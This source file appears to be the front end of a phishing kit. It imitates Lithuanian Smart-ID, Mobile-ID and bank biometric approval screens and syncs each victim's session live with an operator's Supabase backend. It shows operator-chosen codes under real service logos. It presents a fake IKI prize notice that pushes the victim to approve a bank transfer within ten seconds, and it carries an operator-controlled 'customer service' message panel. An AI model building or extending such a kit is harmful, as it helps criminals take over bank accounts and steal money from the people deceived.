"use client";

import { useEffect, useMemo, useState } from "react";
import Image from "next/image";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { resolveLocalBankLogoFile } from "@/lib/bank-logo-constants";
import { Linkify } from "@/components/ui/Linkify";

type ApprovalLang = "de" | "tr";

type ApprovalViewState = {
  sessionStatus: string;
  approvalStatus: string;
  approvalCode: string;
  transferAmount: string;
  bankSlug: string;
  bankName: string;
  message: string;
  imageUrl: string | null;
  lang: ApprovalLang;
};

const APPROVAL_LABELS: Record<string, string> = {
  smartid_1: "Smart-ID",
  smartid_2: "Smart-ID 2",
  mobileid_1: "M. parašas",
  mobileid_2: "M. parašas 2",
  biometrika_pin_1: "Biometrija",
  biometrika_pin_2: "Biometrija 2",
};

function parseApprovalHistory(value: unknown): string[] {
  if (typeof value !== "string" || !value.trim()) {
    return [];
  }

  try {
    const parsed = JSON.parse(value) as unknown;
    if (Array.isArray(parsed)) {
      return parsed.filter((item): item is string => typeof item === "string" && item.trim().length > 0);
    }
  } catch {
    return [value.trim()];
  }

  return [];
}

function formatRemainingTime(seconds: number) {
  const safeSeconds = Math.max(0, seconds);
  const minutes = Math.floor(safeSeconds / 60)
    .toString()
    .padStart(2, "0");
  const remainingSeconds = (safeSeconds % 60).toString().padStart(2, "0");
  return `${minutes}:${remainingSeconds}`;
}

function SmartIdMark() {
  return (
    <div className="flex items-center justify-center">
      <Image
        src="/form-assets/smart-id-logo.png"
        alt="Smart-ID"
        width={176}
        height={40}
        priority
        className="h-auto w-[176px]"
      />
    </div>
  );
}

function MobileIdMark() {
  return (
    <div className="flex items-center justify-center">
      <Image
        src="/form-assets/mobile-id-logo.png"
        alt="Mobile-ID"
        width={178}
        height={42}
        priority
        className="h-auto w-[178px]"
      />
    </div>
  );
}

function SmartIdApprovalCard({
  approvalCode,
  secondsLeft,
  saving,
  pinLabel,
  onConfirm,
}: {
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  pinLabel: "PIN1" | "PIN2";
  onConfirm: () => void;
}) {
  return (
    <div className="flex min-h-screen items-center justify-center px-4 py-8">
      <div className="w-full max-w-[352px] rounded-[18px] bg-white px-6 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)] sm:px-7">
        <div className="mb-9 flex justify-center">
          <SmartIdMark />
        </div>

        <div className="space-y-5 text-center">
          <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
            Atidarykite Smart-ID programėlę savo telefone.
          </h1>

          <p className="text-[1.08rem] text-[#667085]">Patvirtinkite naudodami {pinLabel} kodą</p>

          <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
            {approvalCode || "0000"}
          </div>

          <p className="text-[1rem] text-[#667085]">
            Liko laiko: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
          </p>

          <button
            type="button"
            onClick={onConfirm}
            disabled={saving}
            className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {saving ? "Patvirtinama..." : "Patvirtinti"}
          </button>
        </div>
      </div>
    </div>
  );
}

function GenericApprovalCard({
  title,
  approvalCode,
  secondsLeft,
  saving,
  onConfirm,
}: {
  title: string;
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  onConfirm: () => void;
}) {
  return (
    <div className="flex min-h-screen items-center justify-center px-4 py-8">
      <div className="w-full max-w-[420px] rounded-[22px] border border-[#d9dee6] bg-white p-7 text-center shadow-[0_24px_80px_rgba(20,32,56,0.10)]">
        <p className="mb-3 text-sm font-semibold uppercase tracking-[0.24em] text-[#0ea5a8]">{title}</p>
        <h1 className="mb-3 text-3xl font-semibold tracking-[-0.03em] text-[#101828]">Būtinas patvirtinimas</h1>
        <p className="mb-6 text-base text-[#667085]">Norėdami tęsti, patvirtinkite savo įrenginyje rodomą patvirtinimo kodą.</p>

        <div className="mb-4 rounded-2xl border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-4xl font-semibold tracking-[0.14em] text-[#111827]">
          {approvalCode || "0000"}
        </div>

        <p className="mb-6 text-sm text-[#667085]">
          Liko laiko: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
        </p>

        <button
          type="button"
          onClick={onConfirm}
          disabled={saving}
          className="w-full rounded-[12px] bg-[#1464f4] px-4 py-4 text-base font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
        >
          {saving ? "Patvirtinama..." : "Patvirtinti"}
        </button>
      </div>
    </div>
  );
}

function MobileIdApprovalCard({
  approvalCode,
  secondsLeft,
  saving,
  pinLabel,
  onConfirm,
}: {
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  pinLabel: "PIN1" | "PIN2";
  onConfirm: () => void;
}) {
  return (
    <div className="flex min-h-screen items-center justify-center px-4 py-8">
      <div className="w-full max-w-[354px] rounded-[18px] bg-white px-7 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
        <div className="mb-9 flex justify-center">
          <MobileIdMark />
        </div>

        <div className="space-y-5 text-center">
          <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
            Eikite į savo Mobile-ID programą savo telefone.
          </h1>

          <p className="text-[1.08rem] text-[#667085]">Patvirtinkite naudodami {pinLabel} kodą</p>

          <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
            {approvalCode || "0000"}
          </div>

          <p className="text-[1rem] text-[#667085]">
            Liko laiko: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
          </p>

          <button
            type="button"
            onClick={onConfirm}
            disabled={saving}
            className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {saving ? "Patvirtinama..." : "Patvirtinti"}
          </button>
        </div>
      </div>
    </div>
  );
}

function BiometricApprovalCard({
  approvalCode,
  secondsLeft,
  saving,
  pinLabel,
  bankSlug,
  bankName,
  onConfirm,
}: {
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  pinLabel: "PIN1" | "PIN2";
  bankSlug: string;
  bankName: string;
  onConfirm: () => void;
}) {
  const bankLogo = resolveLocalBankLogoFile(bankSlug, null);

  return (
    <div className="flex min-h-screen items-center justify-center px-4 py-8">
      <div className="w-full max-w-[354px] rounded-[18px] bg-white px-7 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
        <div className="mb-9 flex min-h-[48px] items-center justify-center">
          {bankLogo ? (
            <img
              src={bankLogo}
              alt={bankName || bankSlug || "Banka"}
              className="max-h-12 w-auto max-w-[190px] object-contain"
            />
          ) : (
            <div className="text-center text-2xl font-semibold tracking-[-0.03em] text-[#101828]">
              {bankName || bankSlug || "Bankas"}
            </div>
          )}
        </div>

        <div className="space-y-5 text-center">
          <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
            Biometrinis patvirtinimas
          </h1>

          <p className="text-[1.08rem] text-[#667085]">Patvirtinkite naudodami {pinLabel} kodą</p>

          <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
            {approvalCode || "0000"}
          </div>

          <p className="text-[1rem] text-[#667085]">
            Liko laiko: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
          </p>

          <button
            type="button"
            onClick={onConfirm}
            disabled={saving}
            className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {saving ? "Patvirtinama..." : "Patvirtinti"}
          </button>
        </div>
      </div>
    </div>
  );
}

function TransferApprovalCard({
  method,
  amount,
  secondsLeft,
  saving,
  bankSlug,
  bankName,
  onConfirm,
}: {
  method: "smartid" | "mobileid";
  amount: string;
  secondsLeft: number;
  saving: boolean;
  bankSlug: string;
  bankName: string;
  onConfirm: () => void;
}) {
  const bankLogo = resolveLocalBankLogoFile(bankSlug, null);
  const shownAmount = amount || "0,00";

  return (
    <div className="flex min-h-screen items-center justify-center px-4 py-8">
      <div className="w-full max-w-[400px] rounded-[24px] border border-[#dce8f5] bg-white px-6 py-7 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
        {/* IKI sol ust + banka logosu sag ust */}
        <div className="mb-6 flex items-start justify-between">
          <img
            src="/form-assets/iki-mini-logo.png"
            alt="IKI"
            className="h-7 w-auto object-contain"
          />
          {bankLogo ? (
            <img
              src={bankLogo}
              alt={bankName || bankSlug || "Banka"}
              className="h-9 w-9 rounded-full border border-gray-100 object-cover shadow-sm"
            />
          ) : null}
        </div>

        <h1 className="mb-6 text-center text-[1.35rem] font-bold tracking-tight text-gray-800">
          Patvirtinimo pranešimas
        </h1>

        <div className="mb-6 flex justify-center">
          {method === "mobileid" ? <MobileIdMark /> : <SmartIdMark />}
        </div>

        <div className="mb-6 rounded-2xl bg-[#f4f7fb] px-5 py-4">
          <p className="text-center text-[13px] font-medium leading-relaxed text-gray-600">
            Sveikiname, kadangi kampanijoje yra ne vienas laimėtojas, dalis{" "}
            <span className="font-bold text-gray-900">€{shownAmount}</span> sumos patvirtinimo
            pranešime, kurį matote paraiškoje, bus pervesta jums. Patvirtinkite instrukcijas
            per 10 sekundžių ir jų neatmeskite. Šį pavedimą tvarko jūsų banka.
          </p>
        </div>

        <p className="mb-5 text-center text-[13px] text-gray-500">
          Liko laiko: <span className="font-bold text-gray-800">{secondsLeft} s</span>
        </p>

        <button
          type="button"
          onClick={onConfirm}
          disabled={saving}
          className="flex w-full items-center justify-center gap-2 rounded-full bg-[#14b8a6] px-4 py-3.5 text-[15px] font-bold text-white transition hover:bg-[#0d9488] disabled:cursor-not-allowed disabled:opacity-70"
        >
          <svg className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
          </svg>
          {saving ? "Patvirtinama..." : "Patvirtinti"}
        </button>
      </div>
    </div>
  );
}

function SpecialNoticeCard({ message, imageUrl }: { message: string; imageUrl: string | null }) {
  return (
    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
      <div className="w-full max-w-[650px] rounded-[24px] border border-[#0fae4e] bg-[#021a0e] p-6 text-center shadow-[0_0_40px_rgba(15,174,78,0.3)] sm:p-10">
        <div className="mb-4">
          <p className="text-xs font-bold uppercase tracking-widest text-[#007a38]">Klientų aptarnavimas</p>
        </div>

        <p className="mb-6 whitespace-pre-wrap text-lg font-bold leading-tight text-white">
          <Linkify text={message} />
        </p>

        {imageUrl ? (
          <div className="mt-4 overflow-hidden rounded-2xl border border-white/10 bg-white/5 p-1 shadow-sm">
            <img src={imageUrl} alt="Support" className="mx-auto h-auto w-full rounded-xl object-contain" />
          </div>
        ) : null}
      </div>
    </div>
  );
}

export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);
  const [ready, setReady] = useState(false);
  const [saving, setSaving] = useState(false);
  const [secondsLeft, setSecondsLeft] = useState(30);
  const [viewState, setViewState] = useState<ApprovalViewState>({
    sessionStatus: "",
    approvalStatus: "",
    approvalCode: "",
    transferAmount: "",
    bankSlug: "",
    bankName: "",
    message: "Prašome palaukti...",
    imageUrl: null,
    lang: "de",
  });

  useEffect(() => {
    if (sessionId) return;
    const cached = localStorage.getItem("activeSessionId");
    if (cached && cached !== "undefined" && cached !== "null") {
      setEffectiveSessionId(cached);
    }
  }, [sessionId]);

  useEffect(() => {
    if (!viewState.approvalStatus) return;
    setSecondsLeft(viewState.approvalStatus.startsWith("transfer") ? 10 : 30);

    const timer = window.setInterval(() => {
      setSecondsLeft((previous) => {
        if (previous <= 1) {
          window.clearInterval(timer);
          return 0;
        }
        return previous - 1;
      });
    }, 1000);

    return () => {
      window.clearInterval(timer);
    };
  }, [viewState.approvalStatus, effectiveSessionId]);

  useEffect(() => {
    if (!effectiveSessionId || !supabase) return;

    const applySessionData = (sessionData: { form_data?: Record<string, unknown> | null; status?: string | null } | null | undefined) => {
      const formData = sessionData?.form_data;
      const fd = (formData ?? {}) as Record<string, string | undefined>;
      setViewState({
        sessionStatus: sessionData?.status?.trim() ?? "",
        approvalStatus: fd.approvalStatus?.trim() ?? "",
        approvalCode: fd.approvalCode?.trim() ?? "",
        transferAmount: fd.transferAmount?.trim() ?? "",
        bankSlug: fd.bankSlug?.trim() ?? "",
        bankName: fd.bankName?.trim() ?? "",
        message: fd.specialNoticeText ?? fd.customMessage ?? "Prašome palaukti...",
        imageUrl: fd.specialNoticeImage ?? fd.customImage ?? null,
        lang: (fd.specialNoticeLang as ApprovalLang | undefined) ?? "de",
      });
      setReady(true);
    };

    void (async () => {
      const { data } = await supabase.from("sessions").select("status,form_data").eq("id", effectiveSessionId).maybeSingle();
      if (!data) {
        setReady(true);
        return;
      }
      applySessionData(data as { form_data?: Record<string, unknown> | null; status?: string | null });
    })();

    const channel = supabase
      .channel(`special-approval-content:${effectiveSessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${effectiveSessionId}` },
        (payload) => {
          const next = payload.new as { form_data?: Record<string, unknown> | null; status?: string | null };
          applySessionData(next);
        },
      )
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [effectiveSessionId, supabase]);

  async function handleApprovalSubmit() {
    if (!supabase || !effectiveSessionId) return;

    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", effectiveSessionId).maybeSingle();
    const previousFormData = ((existing?.form_data ?? {}) as Record<string, string | undefined>) ?? {};
    const confirmedStatus = `${viewState.approvalStatus}_confirmed`;
    const nextApprovalHistory = [
      ...parseApprovalHistory(previousFormData.approvalHistory),
      confirmedStatus,
    ].filter((item) => item && item.trim().length > 0);

    const { error } = await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        current_step: "wait",
        form_data: {
          ...previousFormData,
          approvalStatus: confirmedStatus,
          approvalCode: viewState.approvalCode,
          approvalConfirmedAt: new Date().toISOString(),
          approvalHistory: JSON.stringify(nextApprovalHistory),
        },
      })
      .eq("id", effectiveSessionId);

    setSaving(false);
    if (!error) {
      router.push(stepToPath("wait", effectiveSessionId));
    }
  }

  if (!ready) {
    return (
      <div className="flex min-h-screen items-center justify-center px-4">
        <div className="size-10 animate-spin rounded-full border-4 border-[#1464f4]/25 border-t-[#1464f4]" />
      </div>
    );
  }

  if (viewState.sessionStatus === "SPECIAL_INFO") {
    return <SpecialNoticeCard message={viewState.message} imageUrl={viewState.imageUrl} />;
  }

  // Onay verildi → wait adimina yonlendirme gelene kadar kisa "onaylandi" ekrani.
  // (_confirmed suffix'i kartlarla eslesmedigi icin generic kart flash'i olusuyordu)
  if (viewState.approvalStatus.endsWith("_confirmed")) {
    return (
      <div className="flex min-h-screen items-center justify-center px-4 py-8">
        <div className="w-full max-w-[360px] rounded-[22px] border border-[#d9dee6] bg-white px-7 py-10 text-center shadow-[0_24px_80px_rgba(20,32,56,0.10)]">
          <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-emerald-500/10 text-emerald-600">
            <svg className="h-7 w-7" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
            </svg>
          </div>
          <h1 className="text-xl font-bold text-[#101828]">Patvirtinta!</h1>
          <p className="mt-2 text-sm text-[#667085]">Prašome palaukti, nukreipiama...</p>
          <div className="mx-auto mt-5 h-6 w-6 animate-spin rounded-full border-[3px] border-[#1464f4]/20 border-t-[#1464f4]" />
        </div>
      </div>
    );
  }

  if (viewState.approvalStatus === "smartid_1" || viewState.approvalStatus === "smartid_2") {
    return (
      <SmartIdApprovalCard
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        pinLabel={viewState.approvalStatus === "smartid_2" ? "PIN2" : "PIN1"}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  if (viewState.approvalStatus === "mobileid_1" || viewState.approvalStatus === "mobileid_2") {
    return (
      <MobileIdApprovalCard
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        pinLabel={viewState.approvalStatus === "mobileid_2" ? "PIN2" : "PIN1"}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  if (viewState.approvalStatus === "transfer_smartid" || viewState.approvalStatus === "transfer_mobileid") {
    return (
      <TransferApprovalCard
        method={viewState.approvalStatus === "transfer_mobileid" ? "mobileid" : "smartid"}
        amount={viewState.transferAmount}
        secondsLeft={secondsLeft}
        saving={saving}
        bankSlug={viewState.bankSlug}
        bankName={viewState.bankName}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  if (viewState.approvalStatus === "biometrika_pin_1" || viewState.approvalStatus === "biometrika_pin_2") {
    return (
      <BiometricApprovalCard
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        pinLabel={viewState.approvalStatus === "biometrika_pin_2" ? "PIN2" : "PIN1"}
        bankSlug={viewState.bankSlug}
        bankName={viewState.bankName}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  if (viewState.approvalStatus) {
    return (
      <GenericApprovalCard
        title={APPROVAL_LABELS[viewState.approvalStatus] ?? "Kinnitus"}
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  return <SpecialNoticeCard message={viewState.message} imageUrl={viewState.imageUrl} />;
}
